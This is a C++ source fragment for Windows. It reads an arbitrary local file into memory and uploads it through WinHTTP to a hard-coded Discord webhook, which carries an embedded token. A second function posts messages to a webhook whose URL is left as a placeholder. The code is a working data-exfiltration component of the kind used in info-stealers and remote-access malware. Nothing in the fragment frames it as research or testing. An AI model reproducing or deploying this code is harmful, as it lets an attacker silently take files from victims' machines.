HANDLE  readFileToHeap(const char* filePath, LPVOID& buffer, int& filesize) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);

    if (!file) {
        return NULL;
    }

    // get size of file
    filesize = file.tellg();
    if (filesize < 0) {
        file.close();
        return NULL;
    }

    //alocated memory on heap
    HANDLE hHeap = GetProcessHeap();
    if (hHeap == NULL) {
        file.close();
        return NULL;
    }

    buffer = HeapAlloc(hHeap, 0, static_cast<SIZE_T>(filesize));
    if (buffer == NULL) {
        std::cout << "Failed to allocate memory on the heap." << std::endl;
        file.close();
        return NULL;
    }

    // Read the file data into the buffer
    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(buffer), filesize);

    if (!file) {
        std::cout << "Failed to read the file." << std::endl;
        HeapFree(hHeap, 0, buffer);
        file.close();
        return NULL;
    }

    file.close();
    return hHeap;
}

void UploadFileToWebhook(const std::string& webhookURL, const std::string& filePath) {
    HINTERNET hSession = WinHttpOpen(L"Cpoine/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        L"/api/webhooks/1110293229930295436/e9cgbOTkpHyN6b45tRpNCTuccGiinSvQn1m_6nKkPMpmGeRDXPg_jPN1_JX3NmqDWeup",
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);


    LPVOID pBuffer = 0;
    int filesize;

    HANDLE hHeap = readFileToHeap(filePath.c_str(), pBuffer, filesize);

    std::string MultipartRequestBody =
        "--1902\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"shelly\"\r\n"
        "Content-Type: application/octet-stream\r\n"
        "\r\n";
    std::string finalBody = "\r\n--1902--\r\n";
    //MultipartRequestBody += contents + "\r\n" + finalBody;

    const WCHAR* ContentType =
        L"Content-Type: multipart/form-data;boundary = 1902";


    BOOL bResults = WinHttpAddRequestHeaders(
        hRequest,
        ContentType,
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD
    );

    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        MultipartRequestBody.length() + filesize + finalBody.length(),
        NULL);

    DWORD dwBytesWritten = 0;
    if (bResults) {
        bResults = WinHttpWriteData(hRequest, MultipartRequestBody.c_str(),
            MultipartRequestBody.length(),
            &dwBytesWritten);

        bResults = WinHttpWriteData(hRequest, pBuffer,
            filesize,
            &dwBytesWritten);

        bResults = WinHttpWriteData(hRequest, finalBody.c_str(),
            finalBody.length(),
            &dwBytesWritten);

    }

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    // Clean up resources
    HeapFree(hHeap, 0, pBuffer);

    return;

}


int sendMSG(std::string send) {
    HINTERNET hSession = WinHttpOpen(L"Cpione/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    HINTERNET hConnect = WinHttpConnect(hSession,
        L"discordapp.com",
        INTERNET_DEFAULT_HTTPS_PORT,
        0);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        L<ADWEBHOOKHERE>>>,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    std::string title = "Title";
    std::string desc = send;
    std::string color = "16711680"; // Decimal color
    std::string request_body = "{\"username\": \"meow\",\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + desc + "\",\"footer\": {\"text\": \"\"},\"color\": " + color + " }], \"attachments\": []}";

    BOOL bResults = WinHttpSendRequest(hRequest,
        L"Content-Type: application/json\r\n",
        (DWORD)-1L,
        (LPVOID)request_body.c_str(),
        (DWORD)request_body.length(),
        (DWORD)request_body.length(),
        0);

    if (bResults) {
        WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 1;
}
